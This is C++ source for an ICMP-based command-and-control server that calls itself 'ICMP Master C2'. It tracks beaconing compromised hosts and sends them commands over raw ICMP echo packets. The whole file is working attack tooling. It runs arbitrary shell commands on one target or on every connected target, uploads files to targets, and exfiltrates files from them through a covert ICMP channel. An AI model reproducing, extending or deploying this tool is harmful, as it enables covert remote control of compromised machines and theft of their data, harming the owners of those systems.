#include <iostream>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <stdio.h>
#include <string>
#include <thread>
#include <mutex>
#include <map>
#include <vector>
#include <sstream>
#include <fstream>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netdb.h>

static std::map<std::string, std::string> active_connections;
static std::map<std::string, std::string> hosts;
static bool listening = false;
static std::mutex active_connections_mutex;

static uint16_t checksum(void *vdata, uint32_t size)
{
  uint8_t *data = (uint8_t *)vdata;

  // Initialise the accumulator.
  uint64_t acc = 0xffff;

  // Handle any partial block at the start of the data.
  unsigned int offset = ((uintptr_t)data) & 3;
  if (offset)
  {
    size_t count = 4 - offset;
    if (count > size)
      count = size;
    uint32_t word = 0;
    memcpy(offset + (char *)&word, data, count);
    acc += ntohl(word);
    data += count;
    size -= count;
  }

  // Handle any complete 32-bit blocks.
  uint8_t *data_end = data + (size & ~3);
  while (data != data_end)
  {
    uint32_t word;
    memcpy(&word, data, 4);
    acc += ntohl(word);
    data += 4;
  }
  size &= 3;

  // Handle any partial block at the end of the data.
  if (size)
  {
    uint32_t word = 0;
    memcpy(&word, data, size);
    acc += ntohl(word);
  }

  // Handle deferred carries.
  acc = (acc & 0xffffffff) + (acc >> 32);
  while (acc >> 16)
  {
    acc = (acc & 0xffff) + (acc >> 16);
  }

  // If the data began at an odd byte address
  // then reverse the byte order to compensate.
  if (offset & 1)
  {
    acc = ((acc & 0xff00) >> 8) | ((acc & 0x00ff) << 8);
  }

  // Return the checksum in network byte order.
  return ~acc;
}

std::vector<std::string> split_input(std::string &input)
{
  std::vector<std::string> ret;
  std::istringstream iss(input);
  for (std::string s; iss >> s;)
  {
    ret.push_back(s);
  }
  return ret;
}

long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
{
  uint8_t out[1024];
  icmphdr *icmp = (icmphdr *)out;
  icmp->type = 0;
  icmp->code = 0;
  icmp->checksum = 0;
  icmp->un.echo.sequence++;

  if (buf && size > 0)
  {
    memcpy(&out[sizeof(icmphdr)], buf, size);
  }

  icmp->checksum = htons(checksum(out, sizeof(icmphdr) + size));

  sockaddr_in addr_;
  addr_.sin_family = AF_INET;
  addr_.sin_port = htons(0);
  addr_.sin_addr.s_addr = inet_addr(dst.c_str());

  long ret;
  if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
  {
    perror("sendto");
  }
  return ret;
}

long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
{
  long ret = 0;
  uint8_t in[1024];
  if ((ret = read(sockfd, in, sizeof(in))) == -1)
  {
    return -1;
  }

  iphdr *ip = (iphdr *)in;
  if (ret > sizeof(iphdr))
  {
    in_addr addr{ip->saddr};
    char *src_ = inet_ntoa(addr);
    src = src_;

    if (ret > sizeof(iphdr) + sizeof(icmphdr))
    {
      if (buf && size > 0)
      {
        memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), ret - sizeof(iphdr) - sizeof(icmphdr));
      }
    }
  }

  return ret - sizeof(iphdr) - sizeof(icmphdr);
}

void listen_task()
{
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1)
  {
    perror("socket");
    std::exit(-1);
  }

  uint8_t in[1024];
  while (1)
  {
    memset(in, 0, 1024);
    std::string src_ip;
    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));

    if (num_bytes > 0)
    {
      char *hostname_ = (char *)in;
      std::string hostname = hostname_;

      auto split = split_input(hostname);
      if (split.at(0).compare("(beacon)") == 0)
      {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        active_connections[split.at(1)] = src_ip;
      }
    }
  }
}

void send_command(const std::string &dst, const std::string &command)
{
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1)
  {
    perror("socket");
    exit(-1);
  }

  std::string cmd = "run ";
  cmd.append(command);

  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  while (1)
  {
    uint8_t in[512];
    std::string src_ip;
    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));

    if (dst != src_ip)
      continue;

    if (num_bytes > 0)
    {
      char *str_ = (char *)in;
      std::string str(str_, num_bytes);
      std::fputs(str.c_str(), stdout);
    }
    else
    {
      break;
    }
  }
}

void send_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
{
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1)
  {
    perror("socket");
    exit(-1);
  }

  std::string cmd = "file ";
  cmd.append(dst_file);

  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  FILE *fp = fopen(src_file.c_str(), "rb");
  uint8_t out[512];
  if (fp == NULL)
  {
    perror("fopen");
    return;
  }

  size_t nbytes;
  do
  {
    nbytes = fread(out, 1, sizeof(out), fp);
    send_ping(sockfd, dst, out, nbytes);
  } while (nbytes != 0);

  send_ping(sockfd, dst, NULL, 0);
}

void receive_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
{
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1)
  {
    perror("socket");
    exit(-1);
  }

  std::string cmd = "exfil ";
  cmd.append(src_file);

  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  FILE *fp = fopen(dst_file.c_str(), "wb+");
  if (fp == NULL)
  {
    perror("fopen");
    return;
  }

  while (1)
  {
    uint8_t in[512];
    std::string src_ip;
    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));

    if (dst != src_ip)
      continue;

    if (num_bytes > 0)
    {
      fwrite(in, 1, num_bytes, fp);
    }
    else
    {
      fclose(fp);
      break;
    }
  }
}

void ping(const std::string &dst)
{
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1)
  {
    perror("socket");
    exit(-1);
  }
  send_ping(sockfd, dst, NULL, 0);
}

void export_connections(const std::string &filename)
{
  std::ofstream file(filename);
  if (file.is_open())
  {
    std::lock_guard<std::mutex> guard(active_connections_mutex);
    auto it = active_connections.begin();
    for (it; it != active_connections.end(); it++)
    {
      file << it->first << " " << it->second << "\n";
    }
    file.close();
  }
}

void load_connections(const std::string &filename)
{
  std::ifstream file(filename);
  if (file.is_open())
  {
    std::string host, ip;
    while (file >> host >> ip)
    {
      hosts[host] = ip;
    }
    file.close();
  }
}

void help()
{
  std::puts("ICMP Master C2!");
  std::puts("Current commands:");
  std::puts("\thelp: display this message");
  std::puts("\tstart: begin listening for connections");
  std::puts("\tlist: list active connections");
  std::puts("\thosts: list all hosts");
  std::puts("\tping [ip]: ping an ip");
  std::puts("\tpingh [host]: ping a host");
  std::puts("\tbeacon: clears active cache and pings all machines");
  std::puts("\trun [host] [command]: run a command on a target machine");
  std::puts("\trunall [command]: runs command on all machines");
  std::puts("\tfile [host] [src] [dst]: send a file over to host machine");
  std::puts("\texfil [host] [src] [dst]: receive a file from the host machine");
  std::puts("\texport [filename]: exports currently connected hosts to file");
  std::puts("\tload [filename]: loads file to hosts list");
  std::puts("\tclear: clears currently connected list");
  std::puts("\texit: exit program!");
}

int main(int argc, char **argv)
{
  if (argc > 1)
  {
    load_connections(argv[1]);
  }

  help();

  while (1)
  {
    std::string input;
    std::cout << "> ";
    std::getline(std::cin, input);

    auto input_arr = split_input(input);

    if (input_arr.at(0).compare("help") == 0)
    {
      help();
    }
    else if (input_arr.at(0).compare("start") == 0)
    {
      if (listening)
      {
        std::puts("Already listening!");
        continue;
      }
      std::thread listen_thread(listen_task);
      listen_thread.detach();
      listening = true;
    }
    else if (input_arr.at(0).compare("list") == 0)
    {
      std::puts("Listing active machines!");
      std::lock_guard<std::mutex> guard(active_connections_mutex);

      auto it = active_connections.begin();
      for (it; it != active_connections.end(); it++)
      {
        std::cout << it->first << ": " << it->second << "\n";
      }
    }
    else if (input_arr.at(0).compare("hosts") == 0)
    {
      std::puts("Listing host machines!");

      auto it = hosts.begin();
      for (it; it != hosts.end(); it++)
      {
        std::cout << it->first << ": " << it->second << "\n";
      }
    }
    else if (input_arr.at(0).compare("ping") == 0)
    {
      if (input_arr.size() < 2)
      {
        std::puts("usage: ping [ip]");
        continue;
      }
      ping(input_arr.at(1));
      std::cout << "Sending ping to: " << input_arr.at(1) << "\n";
    }
    else if (input_arr.at(0).compare("pingh") == 0)
    {
      if (input_arr.size() < 2)
      {
        std::puts("usage: pingh [host]");
        continue;
      }
      std::string ip = active_connections[input_arr.at(1)];
      ping(ip);
      std::cout << "Sending ping to: " << ip << "\n";
    }
    else if (input_arr.at(0).compare("beacon") == 0)
    {
      std::lock_guard<std::mutex> guard(active_connections_mutex);
      active_connections.clear();
      auto it = hosts.begin();
      for (it; it != hosts.end(); it++)
      {
        std::cout << "Beaconing: " << it->second << "\n";
        ping(it->second);
      }
    }
    else if (input_arr.at(0).compare("run") == 0)
    {
      if (input_arr.size() < 3)
      {
        std::puts("usage: run [host] [command]");
        continue;
      }

      std::string ip = active_connections[input_arr.at(1)];
      std::string command;
      for (int i = 2; i < input_arr.size(); i++)
      {
        command.append(input_arr.at(i));
        if (i != input_arr.size() - 1)
        {
          command.append(" ");
        }
      }

      std::cout << "Running command \"" << command << "\" on "
                << ip
                << "\n";
      send_command(ip, command);
    }
    else if (input_arr.at(0).compare("runall") == 0)
    {
      if (input_arr.size() < 2)
      {
        std::puts("usage: runall [command]");
        continue;
      }

      std::string command;
      for (int i = 1; i < input_arr.size(); i++)
      {
        command.append(input_arr.at(i));
        if (i != input_arr.size() - 1)
        {
          command.append(" ");
        }
      }

      std::lock_guard<std::mutex> guard(active_connections_mutex);
      auto it = active_connections.begin();
      for (it; it != active_connections.end(); it++)
      {
        std::cout << "Running command \"" << command << "\" on "
                  << it->second
                  << "\n";
        send_command(it->second, command);
      }
    }
    else if (input_arr.at(0).compare("file") == 0)
    {
      if (input_arr.size() < 4)
      {
        std::puts("usage: file [host] [src] [dst]");
        continue;
      }
      std::string ip = active_connections[input_arr.at(1)];

      std::cout << "Sending file: " << input_arr.at(2) << " to: " << input_arr.at(3) << " on: "
                << ip
                << "\n";
      send_file(ip, input_arr.at(2), input_arr.at(3));
    }
    else if (input_arr.at(0).compare("exfil") == 0)
    {
      if (input_arr.size() < 4)
      {
        std::puts("usage: exfil [host] [src] [dst]");
        continue;
      }
      std::string ip = active_connections[input_arr.at(1)];

      std::cout << "Receiving file: " << input_arr.at(2) << " to: " << input_arr.at(3) << " on: "
                << ip
                << "\n";
      receive_file(ip, input_arr.at(2), input_arr.at(3));
    }
    else if (input_arr.at(0).compare("export") == 0)
    {
      std::string filename;
      if (input_arr.size() > 1)
      {
        filename = input_arr.at(1);
      }
      else
      {
        filename = "exported.txt";
      }
      std::cout << "Exporting to: " << filename << "\n";
      export_connections(filename);
    }
    else if (input_arr.at(0).compare("load") == 0)
    {
      if (input_arr.size() < 2)
      {
        std::puts("usage: load [filename]");
        continue;
      }
      std::cout << "Loading from: " << input_arr.at(1) << "\n";
      load_connections(input_arr.at(1));
    }
    else if (input_arr.at(0).compare("clear") == 0)
    {
      std::puts("Clearing active connections");
      std::lock_guard<std::mutex> guard(active_connections_mutex);
      active_connections.clear();
    }
    else if (input_arr.at(0).compare("exit") == 0)
    {
      break;
    }
  }

  return 0;
}
